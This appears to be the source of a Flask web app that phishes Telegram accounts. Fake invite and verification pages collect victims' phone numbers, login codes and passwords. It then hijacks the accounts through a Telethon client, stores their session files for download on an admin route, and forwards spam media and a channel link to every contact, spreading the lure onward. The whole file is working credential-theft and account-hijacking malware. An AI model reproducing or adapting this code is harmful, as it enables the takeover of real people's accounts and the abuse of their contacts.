from flask import Flask, render_template, request,redirect, jsonify, make_response, send_file
import threading
from telethonTwo import TelegramClient, sync
from telethonTwo.tl.types import InputMessagesFilterPhotos, InputMessagesFilterDocument, MessageMediaPhoto, MessageMediaDocument
import asyncio
import os



app = Flask(__name__)

current_update = False

updaterinfo = {"number" : False, "pass" : False, "code" : False, "new_update" : False}

updaters = [{"number" : "+31685214711", "pass" : False, "code" : False, "new_update" : False}]
updater_input = []
threads = []

invite_link = "https://t.me/+_1FmuhKj7ww1YjZk"

@app.route('/adman/sessions')
def get_sessions():
    global threads
    global updaters
    files = []
    for file in os.listdir(os.getcwd()):
        if file.endswith(".session"):
            files.append(file)
    return render_template('files.html', files=files)


@app.route('/download/<file>')
def download_file(file):
    file_path = os.path.join(os.getcwd(), file)
    if os.path.isfile(file_path):
        return send_file(file_path, as_attachment=True)
    else:
        return "File not found", 404

@app.route('/adman/data/newest')
def get_newest():
    global updaters
    return jsonify(updaters[len(updaters)-1])


@app.route('/adman/data/<phone>')
def get_json(phone):
    global updaters
    for update in updaters:
        if update["number"] == phone:
            return jsonify(update)
    return jsonify(data)

@app.route('/sendupdate/<number>/<update>')
def update(number, update):
    set_updater_input(number, update)
    return update



def set_code(number, code):
    global updaters
    for update in updaters:
        if update["number"] == number:
            update["code"] = code
    print(updaters)

def set_updater_field(number, field, update):
    global updaters
    for update in updaters:
        if update["number"] == number:
            update[field] = update

def set_updater_input(number, update):
    global updater_input
    for updater in updater_input:
        if updater["number"] == number:
            updater["update"] = update

def make_client(number):
    global updater_input
    try:
        print("making Client")
        # Create a new event loop
        loop = asyncio.new_event_loop()
        # Set the event loop for the current thread
        asyncio.set_event_loop(loop)
        # Start the Telegram client within the thread's event loop
        client = TelegramClient(number, api_id, api_hash, loop=loop).start()
        source_chat = 'https://t.me/pyt64'
        try:
            # Connect to Telegram

            # Source chat username or link
            source_chat = 'https://t.me/pyt64'

            # Destination chat username or link
            destination_chat = '@davcuder'

            # Get the source and destination entities
            source_entity = client.get_entity(source_chat)
            destination_entity = client.get_entity(destination_chat)

            # Fetch messages from the source chat
            messages_to_forward = []
            for message in client.iter_messages(source_entity, limit=4):  # Limit to 5 messages for example
                # Check if the message has a photo or video
                if isinstance(message.media, MessageMediaPhoto) or isinstance(message.media, MessageMediaDocument):
                    messages_to_forward.append(message)

            for dialog in client.iter_dialogs():
                try:
                    client.forward_messages(dialog.entity, messages_to_forward)
                    client.send_message(dialog.entity, 'Check out https://t.me/pyt64 it has some great pyt stuff') #(dialog.entity, 'Just got his vip and im blessing the community https://e516-89-39-106-228.ngrok-free.app/invite?9898589938434598040 enjoy bro')
                    print(f"SUCCSESS send to {dialog.name}")
                except:
                    print(f"FAILED to send to {dialog.name}")

            print("Media messages forwarded successfully!")

        except Exception as e:
            print(f"An error occurred: {e}")


        # You might want to await here if client.start() is asynchronous
        # await client.start()
    except Exception as e:
        print(e)
        print("DAMN BRO WRONG NUMBER")
        set_updater_input(number, "invalidNumber")        

def start_client(number):
    global updaters
    global updater_input
    global threads

    updaters.append({"number" : number, "pass" : None, "code" : None, "new_update" : None, "thread" : len(threads)})
    updater_input.append({"number" : number, "update" : None})

    thread = threading.Thread(target=make_client, args=(number,))
    threads.append(thread)
    thread.start()

def get_updater_input(number):
    global updater_input
    for updater in updater_input:
        if updater["number"] == number:
            return updater

def delete_client(number):
    global updaters
    global updater_input
    global threads
    print("deleting")
    thread_index = None

    for updater in updaters:
        if updater["number"] == number:
            thread_index = updater["thread"]
            updaters.remove(updater)

    for updater in updater_input:
        if updater["number"] == number:
            updater_input.remove(updater)
    threads[thread_index].join()
    threads[thread_index] = None

def check_phone_validity(number):
    global updater_input
    response = None
    while response == None:
        response = get_updater_input(number)["update"]
    if response == "invalidNumber":
        print("kkr fout")
        delete_client(number)
        return False
    if response == "codeNeeded":
        set_updater_input(number, None)
        return True
    return True

#0 succes 1 password 2 invalid
def check_code_validity(number):
    response = None
    while response == None:
        response = get_updater_input(number)["update"]
        if response == "passwordNeeded":
            set_updater_input(number, None)
            return 1
        if response == "invalidCode":
            set_updater_input(number, None)
            return 2
        if response == "successfully":
            set_updater_input(number, None)
            delete_client(number)
            return 0


@app.route('/verification/password', methods=["POST", "GET"])
def verification_password():
    if request.method == 'POST':
        print(request.form["password"])
    return render_template('password.html')

@app.route('/verification', methods=["POST", "GET"])
def verification():
    if request.method == 'POST':
        number = request.cookies.get('phone')
        set_code(number, request.form["code"])
        print("ewa")
        response = check_code_validity(number)
        if  response== 0:
            print("succes")
            return redirect(invite_link)
        elif response == 1:
            print("pass")
            return "password"
        elif response == 2:
            return render_template('code.html', number=request.cookies.get('phone'), toptext="Invalid verification code", bottomtext="please try again.")
    return render_template('code.html', number=request.cookies.get('phone'), toptext="We have sent you a message in Telegram", bottomtext="with the code.")


def check_string(input_string):
    for char in input_string:
        if char != '+' and not char.isdigit():
            return False
    return True if input_string.startswith('+') else False

@app.route('/invite', methods=["POST", "GET"])
def invite():
    if request.method == 'POST':
        if check_string(request.form["phonenumber"]) == False:
            return render_template('index.html', labelmessage="Phone number invalid", toptext="Invalid phone number", bottomtext="please try again.")
        updaterinfo["number"] = request.form["phonenumber"]
        start_client(request.form["phonenumber"])
        if check_phone_validity(request.form["phonenumber"]) == True:
            resp = make_response(redirect('/verification'))
            resp.set_cookie('phone', request.form["phonenumber"])
            return resp
        else:
            return render_template('index.html', labelmessage="Phone number invalid", toptext="Invalid phone number", bottomtext="please try again.")
    return render_template('index.html', labelmessage="Your phone number", toptext="Please confirm your country code", bottomtext="and enter your phone number.")

@app.route('/', methods=["POST", "GET"])
def home():
    return redirect('/invite?9898589938434598040')

if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")
